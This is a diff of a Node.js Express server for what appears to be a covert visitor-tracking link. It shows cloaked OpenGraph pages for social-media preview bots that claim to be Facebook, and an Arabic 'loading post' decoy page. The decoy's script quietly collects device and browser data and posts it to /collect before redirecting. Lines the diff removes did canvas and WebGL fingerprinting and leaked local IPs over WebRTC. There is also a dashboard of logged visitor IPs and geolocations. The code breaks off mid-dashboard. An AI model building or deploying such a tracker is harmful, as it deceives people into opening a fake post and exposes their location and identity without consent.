@@ -1,12 +1,11 @@
 const express = require('express');
-const bodyParser = require('body-parser');
 const requestIp = require('request-ip');
 const geoip = require('geoip-lite');
 const UAParser = require('ua-parser-js');
 const fs = require('fs');
 const app = express();
 
-app.use(bodyParser.json({ limit: '50mb' }));
+app.use(express.json({ limit: '50mb' }));
 app.use(requestIp.mw());
 
 const CONFIG = {
@@ -24,7 +23,7 @@ function loadLogs() {
   if (!fs.existsSync(LOG_FILE)) return [];
   try {
     return fs.readFileSync(LOG_FILE, 'utf8').split('\n').filter(Boolean).map(JSON.parse).reverse();
-  } catch { return []; }
+  } catch (e) { return []; }
 }
 
 function saveLog(entry) {
@@ -33,7 +32,8 @@ function saveLog(entry) {
 
 function isBot(req) {
   const ua = (req.headers['user-agent'] || '').toLowerCase();
-  return ['facebookexternalhit','facebot','whatsapp','twitterbot','linkedinbot','telegrambot','discordbot','slackbot','googlebot','bingbot','pinterest','applebot','yandex','snapchat'].some(b => ua.includes(b));
+  const bots = ['facebookexternalhit','facebot','whatsapp','twitterbot','linkedinbot','telegrambot','discordbot','slackbot','googlebot','bingbot','pinterest','applebot','yandex','snapchat'];
+  return bots.some(b => ua.includes(b));
 }
 
 function getClientData(req) {
@@ -44,58 +44,160 @@ function getClientData(req) {
   return { ip, geo, uaString, ua };
 }
 
-app.get('/robots.txt', (req, res) => res.type('text/plain').send('User-agent: *\nAllow: /\n'));
-
-app.get(['/', '/track'], (req, res) => {
-  const { ip, geo, uaString, ua } = getClientData(req);
-  const visitId = 'v_' + Date.now() + '_' + Math.random().toString(36).substr(2,9);
-  
-  const serverData = {
-    visitId, timestamp: new Date().toISOString(),
-    server: { ip, geo, userAgent: uaString, referer: req.headers.referer||'Direct', acceptLanguage: req.headers['accept-language']||'Unknown', method: req.method, host: req.headers.host, protocol: req.protocol, url: req.originalUrl },
-    parsedUA: { browser: ua.browser, engine: ua.engine, os: ua.os, device: ua.device, cpu: ua.cpu }
-  };
-  
-  res.cookie('visitId', visitId, { maxAge: 300000, httpOnly: false });
-
-  if (isBot(req)) {
-    const { og_title, og_description, og_image, target_url } = CONFIG;
-    res.type('html').send(`<!DOCTYPE html>
-<html lang="ar" dir="rtl"><head><meta charset="UTF-8">
-<meta property="og:title" content="${og_title.replace(/"/g, '&quot;')}" />
-<meta property="og:description" content="${og_description.replace(/"/g, '&quot;')}" />
-<meta property="og:image" content="${og_image}" />
+function buildBotHTML(cfg) {
+  const title = cfg.og_title.replace(/"/g, '&quot;');
+  const desc = cfg.og_description.replace(/"/g, '&quot;');
+  const t = cfg.og_title.replace(/</g, '&lt;');
+  const d = cfg.og_description.replace(/</g, '&lt;');
+  return `<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta property="og:title" content="${title}" />
+<meta property="og:description" content="${desc}" />
+<meta property="og:image" content="${cfg.og_image}" />
 <meta property="og:image:width" content="1200" />
 <meta property="og:image:height" content="630" />
-<meta property="og:url" content="${target_url}" />
-<meta property="og:type" content="article" /><meta property="og:site_name" content="Facebook" />
-<meta property="twitter:card" content="summary_large_image"><meta property="twitter:image" content="${og_image}">
-<title>${og_title.replace(/</g,'&lt;')}</title><link rel="canonical" href="${target_url}"></head>
-<body><h1>${og_title.replace(/</g,'&lt;')}</h1><p>${og_description.replace(/</g,'&lt;')}</p><img src="${og_image}" style="max-width:100%"></body></html>`);
-    return;
-  }
+<meta property="og:url" content="${cfg.target_url}" />
+<meta property="og:type" content="article" />
+<meta property="og:site_name" content="Facebook" />
+<meta property="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="${cfg.og_image}" />
+<title>${t}</title>
+<link rel="canonical" href="${cfg.target_url}">
+</head>
+<body>
+<h1>${t}</h1>
+<p>${d}</p>
+<img src="${cfg.og_image}" style="max-width:100%">
+</body>
+</html>`;
+}
 
-  const target = CONFIG.target_url;
-  res.type('html').send(`<!DOCTYPE html><html lang="ar" dir="rtl">
-<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+function buildTrackerHTML(id, target, delay) {
+  const targetEsc = JSON.stringify(target);
+  return `<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
 <title>جاري تحميل المنشور...</title>
 <style>body{font-family:Arial,sans-serif;text-align:center;padding-top:20vh;background:#f0f2f5;margin:0;color:#65676b;}
 .spinner{border:4px solid #e4e6eb;border-top:4px solid #1877f2;border-radius:50%;width:48px;height:48px;animation:spin 1s linear infinite;margin:0 auto 20px;}
-@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}</style></head>
-<body><div class="spinner"></div><h3>جاري تحميل المنشور...</h3>
-<script>(function(){
-var visitId="${visitId}";
-var data={visitId:visitId,timestamp:new Date().toISOString(),
-screen:{width:screen.width,height:screen.height,availWidth:screen.availWidth,availHeight:screen.availHeight,colorDepth:screen.colorDepth,pixelRatio:window.devicePixelRatio||1,orientation:screen.orientation?screen.orientation.type:'unknown'},
-window:{innerWidth:window.innerWidth,innerHeight:window.innerHeight,outerWidth:window.outerWidth,outerHeight:window.outerHeight},
-navigator:{platform:navigator.platform,language:navigator.language,languages:navigator.languages?Array.from(navigator.languages):[navigator.language],cookieEnabled:navigator.cookieEnabled,onLine:navigator.onLine,hardwareConcurrency:navigator.hardwareConcurrency||'unknown',deviceMemory:navigator.deviceMemory||'unknown',maxTouchPoints:navigator.maxTouchPoints||0,pdfViewerEnabled:navigator.pdfViewerEnabled||false,javaEnabled:navigator.javaEnabled?navigator.javaEnabled():false,webdriver:navigator.webdriver||false},
-timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,timezoneOffset:new Date().getTimezoneOffset(),
-plugins:Array.from(navigator.plugins||[]).map(function(p){return{name:p.name,description:p.description,filename:p.filename};}),
-mimeTypes:Array.from(navigator.mimeTypes||[]).map(function(m){return{type:m.type,description:m.description};}),
-touchSupport:'ontouchstart'in window||navigator.maxTouchPoints>0,doNotTrack:navigator.doNotTrack||false,
-storage:{localStorage:!!window.localStorage,sessionStorage:!!window.sessionStorage,indexedDB:!!window.indexedDB,webSQL:!!window.openDatabase},
-referrer:document.referrer||"",location:{href:location.href,protocol:location.protocol,host:location.host,pathname:location.pathname,search:location.search}};
-try{var c=document.createElement('canvas');var ctx=c.getContext('2d');c.width=200;c.height=60;ctx.textBaseline='top';ctx.font='14px Arial';ctx.fillStyle='#f60';ctx.fillRect(0,0,200,60);ctx.fillStyle='#069';ctx.fillText('FP:'+navigator.userAgent,2,15);ctx.fillStyle='rgba(102,204,0,0.7)';ctx.fillText('Canvas:'+c.width+'x'+c.height,4,35);data.canvasFingerprint=c.toDataURL().slice(0,200);}catch(e){data.canvasFingerprint='blocked';}
-try{var gl=document.createElement('canvas').getContext('webgl')||document.createElement('canvas').getContext('experimental-webgl');if(gl){var dbg=gl.getExtension('WEBGL_debug_renderer_info');data.webglVendor=gl.getParameter(gl.VENDOR);data.webglRenderer=gl.getParameter(gl.RENDERER);if(dbg){data.webglVendor=gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);data.webglRenderer=gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);}data.webglFingerprint=data.webglVendor+'|'+data.webglRenderer;}}catch(e){data.webglFingerprint='blocked';}
-try{var RTCPeerConnection=window.RTCPeerConnection||window.mozRTCPeerConnection||window.webkitRTCPeerConnection;if(RTCPeerConnection){var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});var seen={};data.webrtc=[];pc.createDataChannel('');pc.createOffer().then(function(o){pc.setLocalDescription(o);});pc.onicecandidate=function(ice){if(!ice||!ice.candidate||!ice.candidate.candidate)return;var ipMatch=/([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/.exec(ice.candidate.candidate);if(ipMatch&&!seen[ipMatch[1]]){seen[ipMatch[1]]=true;data.webrtc.push(ipMatch[1]);}};}}catch(e){data.webrtc=['webrtc-blocked'];}
-try{var baseFonts=['monospace','sans-serif','serif'];var testFonts=['Arial','Courier New','Georgia','I
+@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}</style>
+</head>
+<body>
+<div class="spinner"></div>
+<h3>جاري تحميل المنشور...</h3>
+<script>
+(function(){
+  var visitId = "${id}";
+  var target = ${targetEsc};
+  var data = {
+    visitId: visitId,
+    timestamp: new Date().toISOString(),
+    screen: {width:screen.width, height:screen.height, colorDepth:screen.colorDepth, pixelRatio:window.devicePixelRatio||1},
+    window: {innerWidth:window.innerWidth, innerHeight:window.innerHeight},
+    navigator: {
+      platform:navigator.platform, language:navigator.language, languages:navigator.languages?Array.from(navigator.languages):[navigator.language],
+      cookieEnabled:navigator.cookieEnabled, onLine:navigator.onLine,
+      hardwareConcurrency:navigator.hardwareConcurrency||'unknown',
+      deviceMemory:navigator.deviceMemory||'unknown',
+      maxTouchPoints:navigator.maxTouchPoints||0
+    },
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    timezoneOffset: new Date().getTimezoneOffset()
+  };
+  setTimeout(function(){
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST','/collect', true);
+    xhr.setRequestHeader('Content-Type','application/json');
+    xhr.send(JSON.stringify(data));
+  }, 1000);
+  setTimeout(function(){
+    window.location.href = target;
+  }, ${delay});
+})();
+</script>
+</body>
+</html>`;
+}
+
+app.get('/robots.txt', (req, res) => {
+  res.type('text/plain').send('User-agent: *\nAllow: /\n');
+});
+
+app.get(['/', '/track'], (req, res) => {
+  const { ip, geo, uaString, ua } = getClientData(req);
+  const visitId = 'v_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+
+  const entry = {
+    visitId, timestamp: new Date().toISOString(),
+    server: { ip, geo, userAgent: uaString, referer: req.headers.referer || 'Direct', acceptLanguage: req.headers['accept-language'] || 'Unknown', method: req.method, host: req.headers.host, protocol: req.protocol, url: req.originalUrl },
+    parsedUA: { browser: ua.browser, engine: ua.engine, os: ua.os, device: ua.device, cpu: ua.cpu }
+  };
+  saveLog(entry);
+
+  if (isBot(req)) {
+    res.set('Cache-Control', 'public, max-age=3600');
+    return res.type('html').send(buildBotHTML(CONFIG));
+  }
+
+  res.set('Cache-Control', 'no-store');
+  res.type('html').send(buildTrackerHTML(visitId, CONFIG.target_url, CONFIG.redirect_delay + 1500));
+});
+
+app.post('/collect', (req, res) => {
+  const body = req.body;
+  if (!body || !body.visitId) return res.status(400).json({ error: 'missing visitId' });
+
+  const logs = loadLogs().reverse();
+  const existing = logs.find(l => l.visitId === body.visitId);
+
+  if (existing) {
+    Object.assign(existing, body);
+  } else {
+    const { ip, geo, uaString, ua } = getClientData(req);
+    logs.push({
+      visitId: body.visitId,
+      timestamp: new Date().toISOString(),
+      server: { ip, geo, userAgent: uaString, referer: req.headers.referer || 'Direct', acceptLanguage: req.headers['accept-language'] || 'Unknown' },
+      parsedUA: { browser: ua.browser, engine: ua.engine, os: ua.os, device: ua.device, cpu: ua.cpu },
+      ...body
+    });
+  }
+
+  const fd = fs.openSync(LOG_FILE, 'w');
+  logs.slice().reverse().forEach(l => fs.writeSync(fd, JSON.stringify(l) + '\n'));
+  fs.closeSync(fd);
+  res.json({ status: 'ok' });
+});
+
+app.get('/dashboard', (req, res) => {
+  const pass = req.query.pass || '';
+  if (pass !== CONFIG.admin_password) return res.status(403).send('Access Denied');
+
+  const logs = loadLogs();
+  let html = `<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<title>لوحة التحكم</title>
+<style>
+body{background:#0f1115;color:#e4e6eb;font-family:Arial,sans-serif;padding:20px;margin:0;}
+h1{color:#1877f2;border-bottom:2px solid #1877f2;padding-bottom:10px;}
+table{width:100%;border-collapse:collapse;font-size:0.85em;margin-top:15px;}
+th,td{padding:10px;border-bottom:1px solid #333;text-align:right;}
+th{background:#1c1e24;color:#1877f2;position:sticky;top:0;}
+tr:hover{background:#1c1e24;}
+.badge{display:inline-block;padding:2px 6px;border-radius:4px;background:#333;font-size:0.8em;margin:2px;}
+.critical{color:#ff4444;font-weight:bold;}
+.ok{color:#00ff88;}
+a{color:#00ccff;}</style>
+</head>
+<body>
+<h1>Visitor Logs | Total: ${logs.length}</h1>`;
+
+  if (logs.length === 0) {
+    html += '<p style="color:#777">No visits yet.</p>';
+  } else 
